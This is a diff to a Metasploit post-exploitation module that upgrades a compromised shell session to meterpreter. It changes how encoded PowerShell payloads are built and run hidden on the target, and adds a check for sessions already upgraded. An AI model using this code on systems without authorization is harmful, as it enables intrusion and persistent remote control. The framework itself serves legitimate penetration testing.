@@ -2,9 +2,7 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core/exploit/powershell'
-require 'msf/core/post/windows/powershell'
+require 'rex/exploitation/cmdstager'
 
 class MetasploitModule < Msf::Post
   include Exploit::Powershell
@@ -51,6 +49,11 @@ class MetasploitModule < Msf::Post
   # Run method for when run command is issued
   def run
     print_status("Upgrading session ID: #{datastore['SESSION']}")
+
+    if session.type == 'meterpreter'
+      print_error("Meterpreter sessions cannot be upgraded any higher")
+      return nil
+    end
 
     # Try hard to find a valid LHOST value in order to
     # make running 'sessions -u' as robust as possible.
@@ -157,10 +160,13 @@ class MetasploitModule < Msf::Post
 
         encoded_psh_payload = encode_script(psh_payload)
         cmd_exec(run_hidden_psh(encoded_psh_payload, psh_arch, true))
-      else # shell
+      else
         if (have_powershell?) && (datastore['WIN_TRANSFER'] != 'VBS')
           vprint_status("Transfer method: Powershell")
-          psh_opts = { :prepend_sleep => 1, :encode_inner_payload => true, :persist => false }
+          psh_opts = { :encode_final_payload => true, :persist => false, :prepend_sleep => 1 }
+          unless session.type == 'shell'
+            psh_opts[:remove_comspec] = true
+          end
           cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
         else
           print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
